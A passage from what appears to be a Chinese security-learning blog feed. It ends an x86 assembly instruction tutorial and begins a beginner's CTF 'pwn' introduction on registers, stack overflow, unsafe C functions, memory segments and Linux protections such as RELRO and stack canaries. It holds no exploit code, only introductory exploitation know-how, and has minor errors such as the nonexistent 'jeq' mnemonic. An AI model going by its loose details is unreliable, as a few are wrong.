&lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; 将EAX的内容乘以内存位置var的32位内容并将结果存储在EAX中<br>imul esi, edi, 25 ; ESI → EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-整数除法"><a href="#idiv-整数除法" class="headerlink" title="idiv-整数除法"></a>idiv-整数除法</h4><p>idiv指令将64位整数<code>EDX:EAX</code>的内容除以指定的操作对象值。结果存储在EAX中，其余数的存储在EDX中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; 将EDX:EAX的内容除以EBX的内容。把商放在EAX中，余放在EDX中<br>idiv DWORD PTR [var] ; 将EDX:EAX的内容除以存储在内存位置var的32位值。把商放在EAX中，余放在EDX中<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-按位与、或和异或"><a href="#and-or-xor-按位与、或和异或" class="headerlink" title="and,or xor-按位与、或和异或"></a>and,or xor-按位与、或和异或</h4><p>这些指令对其操作对象执行指定的位运算（分别为按位与、或和异或），并将结果放在第一个操作对象位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; 清除EAX的除最后4位以外的所有位<br>xor edx, edx ; 将EDX的内容设置为零<br></code></pre></td></tr></table></figure><h4 id="not-按位取反"><a href="#not-按位取反" class="headerlink" title="not-按位取反"></a>not-按位取反</h4><p>not指令触发反转操作对象中的所有位，其结果称为反码。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; 取反内存位置var的字节中的所有位<br></code></pre></td></tr></table></figure><h4 id="neg-求补"><a href="#neg-求补" class="headerlink" title="neg-求补"></a>neg-求补</h4><p>neg是汇编指令中的求补指令，对操作对象执行求补运算：用0减去操作对象，然后结果返回操作对象；或是直接将操作对象按位取反后+1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX → - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-左移，右移"><a href="#shl-shr-左移，右移" class="headerlink" title="shl, shr-左移，右移"></a>shl, shr-左移，右移</h4><p>这些指令将其第一个操作对象内容中的位左右移位，用零填充产生的空位位置。移位后的操作对象最多可以移位31位。要移位的位数由第二个操作对象指定，该操作对象可以是8位常量，也可以是寄存器CL。</p><p>在任一情况下，以32为模执行大于31的移位计数。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; 将EAX的值乘以2（如果最高有效位为0）<br>shr ebx, cl ; 将EBX的值除以2^n^的结果的下限存储在EBX中，其中n是CL中的值<br></code></pre></td></tr></table></figure><h2 id="控制流指令"><a href="#控制流指令" class="headerlink" title="控制流指令"></a>控制流指令</h2><p>x86处理器维护一个指令指针（IP）寄存器，它是一个32位值，指示当前指令在内存中的起始位置。通常，在执行一条指令后，它会递增以指向内存中的下一条指令的起始位置。IP寄存器不能直接操作，而是由提供的控制流指令隐式更新。</p><blockquote><p>我们使用符号&lt;LABEL&gt;来表示代码中已标记的位置。通过输入标签名称后跟冒号，可以在x86汇编代码中的任意位置插入标签。</p></blockquote><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>此代码段中的第二条指令被标记为begin。在代码的其他地方，我们可以使用更方便的符号名称begin来引用此指令所在的内存中的位置。这个标签只是表示位置的一种方便方式，而不是它的32位值。</p><h4 id="jmp-跳转"><a href="#jmp-跳转" class="headerlink" title="jmp-跳转"></a>jmp-跳转</h4><p>将程序控制流转移到操作对象指示的内存位置上</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; 跳到标记为begin的指令位置<br></code></pre></td></tr></table></figure><h4 id="jcondition-条件跳转"><a href="#jcondition-条件跳转" class="headerlink" title="jcondition-条件跳转"></a>jcondition-条件跳转</h4><p>这些指令是基于一组条件码状态判断是否进行跳转，该条件码被存储在称为机器状态字的特殊寄存器中。</p><p>机器状态字的内容包括有关上次执行的算术运算的信息。例如，此字的某一比特位表示最后结果是否为零，某另一个比特位指示上次结果是否为负数。</p><p>基于这些条件码，可以执行多个条件跳转。例如，如果上次算术运算的结果为零，则JZ指令执行到指定操作对象标签的跳转。否则，控制按顺序前进到下一条指令。</p><p>许多条件分支的名字都是根据上一次执行的特殊比较指令cmp命名的。例如，条件分支（如JLE和JNE）基于首先对所需操作对象执行cmp操作。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; 相等时跳转<br>jne &lt;label&gt; ; 不相等时跳转<br>jz &lt;label&gt;  ; 最后结果为零时跳转<br>jg &lt;label&gt;  ; 大于时跳转<br>jge &lt;label&gt; ; 大于等于时跳转<br>jl &lt;label&gt;  ; 小于时跳转<br>jle &lt;label&gt; ; 小于等于时跳转<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; 如果EAX的中的值小于或等于EBX中的值，跳至标签done。否则，继续执行下一条指令<br></code></pre></td></tr></table></figure><h4 id="cmp-比较"><a href="#cmp-比较" class="headerlink" title="cmp-比较"></a>cmp-比较</h4><p>比较两个指定操作对象的值，适当设置机器状态字中的条件代码。此指令等同于sub指令，不同之处在于将丢弃减法结果，而不是替换第一个操作对象。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; 如果存储在var中的4个字节的值等于4字节整数常量10，则跳转到标记为loop的位置<br></code></pre></td></tr></table></figure><h4 id="call-ret-子程序调用和返回"><a href="#call-ret-子程序调用和返回" class="headerlink" title="call, ret-子程序调用和返回"></a>call, ret-子程序调用和返回</h4><p>这些指令实现一个子程序调用和返回。</p><p>call指令首先将当前代码位置压入到内存中硬件支持的堆栈中，然后无条件跳转到标签操作对象指示的代码位置。与简单的跳转指令不同，call指令保存当前位置，并在子程序完成时返回到此处。</p><p>ret指令实现子程序返回机制。此指令首先从硬件支持的内存堆栈中弹出代码位置，然后无条件跳转至该代码位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>最近一直被问x86学完了没，这算学完叭（小声bb)🤨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在PWN的边缘疯狂试探</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>一点点 pwn 基础——栈和堆、汇编基础和Linux常用保护机制</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PWN是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音–砰的一声，被”黑”的电脑或手机就被你操纵了 。</p><p>（上文来自百度）</p><p>个人认为解决PWN题就是利用简单的逆向得到代码，从代码中发现漏洞，再通过二进制或系统调用等方式利用这些漏洞获得目标主机的shell 。</p><p>很酷！！！！！😎</p><h1 id="前知知识"><a href="#前知知识" class="headerlink" title="前知知识"></a>前知知识</h1><p>就是我只知道这么多就来学pwn了</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>寄存器是CPU内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。</p><p>我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。</p><p>编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用.</p><p>例如<code>mov $5, %eax</code>或<code>mov eax, 5</code>表示将5赋值给寄存器<strong>eax</strong>。</p><p> 不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母<strong>“e”</strong>作名称前缀，指示寄存器大小为32位；x86_64架构用字母<strong>“r”</strong>作名称前缀，指示各寄存器大小为64位。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出就是数据会占用一个存储空间，但是我们写代码的时候默认输入数据就是符合规定的数据，并没有对输入数据进行限制，这时超出这个空间大小的数据就会输入到合法空间以外的地方并造成破坏。</p><p>借此我们就可以控制这个不允许用户操作的空间内的寄存器，改变寄存器的值达到代码执行的效果。</p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><p>输入：</p><ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul><p>输出：</p><ul><li>sprintf</li></ul><p>字符串：</p><ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul><h3 id="Linux的一些基础命令"><a href="#Linux的一些基础命令" class="headerlink" title="Linux的一些基础命令"></a>Linux的一些基础命令</h3><p><code>sudo</code> ：SuperUserDo 在需要权限的命令前使用</p><p><code>apt-get</code>：可以执行安装、升级、甚至移除软件这类任务</p><p><code>grep</code>：配合正则表达式食用，用于寻找文件或内容</p><p><code>cat</code>：查看文件</p><p><code>rm</code>：移除文件，还可以使用**-r**来进行递归移除，从而移除整个文件夹</p><p><code>cp</code>：拷贝文件</p><p><code>ls</code>：查看目录下的文件</p><p><del>暂时只想起这么多</del></p><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><blockquote><p>pwn 研究二进制还是要学习底层计算机语言的😢</p></blockquote><p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 <code>ADD</code>。</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><p>一般情况下，程序都是由bss段，text段和date段三个段组成。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss 段：只有定义而没有赋初值的全局变量和静态变量。</p><p>data 段：存放在编译阶段 (而非运行时) 就能确定的数据，可读可写。就是通常所说的<strong>静态存储区</strong>，存储赋了初值的全局变量和赋初值的静态变量以及常量。</p><p>text 段：放<strong>程序代码</strong>，在编译时确定，只读。</p><h5 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h5><p>bss段是用来存放未初始化的全局变量和静态变量的一块内存区域，一般在初始化时bss段部分会清零。</p><h5 id="text段"><a href="#text段" class="headerlink" title=".text段"></a>.text段</h5><p>存放程序代码的区域，在编译时确定，只读。</p><p>更进一步讲是存放处理器的机器指令，当各个源文件单独编译之后生成目标文件，经连接器连接各个目标文件并解决各个源文件之间的函数引用。与此同时，还要将所有目标文件中的.text段合在一起，但不是简单的将他们“堆”在一起，还要处理各个段之间函数引用问题。</p><h5 id="date段"><a href="#date段" class="headerlink" title=".date段"></a>.date段</h5><p>用于存放在编译阶段（而非运行时）就能确定的数据，可读可写。也是通常所说的静态存储区，赋了初值的全局变量，常量和静态变量都存放在这个区域。</p><h4 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap-堆"></a>Heap-堆</h4><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址(低位），结束地址是较大的那个地址（高位）。</p><p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分。</p><blockquote><p>实际上，起始地址会有一段静态数据，这里忽略</p></blockquote><p>举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>这种因为用户主动请求而划分出来的内存区域，就叫做 Heap（堆）。它由<strong>起始地址</strong>开始，从<strong>低位</strong>向<strong>高位</strong>增长。Heap 的一个重要特点就是<strong>不会自动消失</strong>，必须手动释放，或者由垃圾回收机制来回收。</p><h4 id="Strack-栈"><a href="#Strack-栈" class="headerlink" title="Strack-栈"></a>Strack-栈</h4><p>Stack 是由于函数运行而临时占用的内存区域。Stack 是由内存区域的<strong>结束地址</strong>开始，从<strong>高位</strong>向<strong>低位</strong>分配。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p><p>比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p><p>举个具体的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如a和b）都保存在这个帧里面。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>当调用其他函数时，程序运行到这一行，会新建一个帧。此时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。</p><p>生成新的帧，叫做”压栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”<strong>后进先出</strong>“的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p><h4 id="一个🌰"><a href="#一个🌰" class="headerlink" title="一个🌰"></a>一个🌰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将其转换为汇编语言就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, %edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>以我现在的水平还不是很能看明白，我就是把文件全复制下来了</p></blockquote><p>简化以后主要就是这些内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>可以看到原程序两个函数<code>add_a_and_b</code>和<code>main</code>对应上面的两个标签<code>_add_a_and_b</code>和<code>_main</code>，每个标签里面是该函数所转成的 CPU 运行流程，每一行就是 CPU 执行的一次操作。</p><p>以其中一行为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>这一行里面，<code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。</p><h4 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h4><table><thead><tr><th>汇编指令</th><th>实际作用</th><th>等价代码</th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>用于赋值</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>用于加&#x2F;减法</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>用于与&#x2F;异或&#x2F;或</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>压栈</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>出栈</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>调用函数</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>从函数返回</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><table><thead><tr><th>汇编指令示例</th><th>英文全称</th><th>实际作用</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>跳转</td></tr><tr><td>jz</td><td>jump if zero</td><td>为0时跳转</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>不为零时跳转</td></tr><tr><td>jg</td><td>jump if greater</td><td>有符号数大于跳转</td></tr><tr><td>jl</td><td>jump if lsee</td><td>有符号数小于跳转</td></tr></tbody></table><p>跳转指令不同于 mov 指令，他可以用于修改段寄存器 cs、ip 的值，从而修改 CPU 在内存中所读取的内容的地址。</p><p><del>表格是从小卓的博客copy来的</del></p><h1 id="Linux常用保护机制"><a href="#Linux常用保护机制" class="headerlink" title="Linux常用保护机制"></a>Linux常用保护机制</h1><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了 保护机制</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>这不是个保护机制是个脚本软件。</p><p>checksec用来检查可执行文件的属性，查看文件开启了哪些保护机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>以之前一道 Pwn 题题目为例：<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>RELRO即为read only relocation，可以理解为我们熟悉的windows系统里的只读。</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。</p><h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // 默认情况下，是Partial RELRO<br>gcc -z norelro -o hello test.c // 关闭，即No RELRO<br>gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO<br>gcc -z now -o hello test.c // 全部开启，即Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARY（栈保护）"><a href="#CANNARY（栈保护）" class="headerlink" title="CANNARY（栈保护）"></a>CANNARY（栈保护）</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。</p><p>在 Linux 中我们将 cookie 信息称为 canary。</p><h4 id="参数设置-1"><a href="#参数设置-1" class="headerlink" 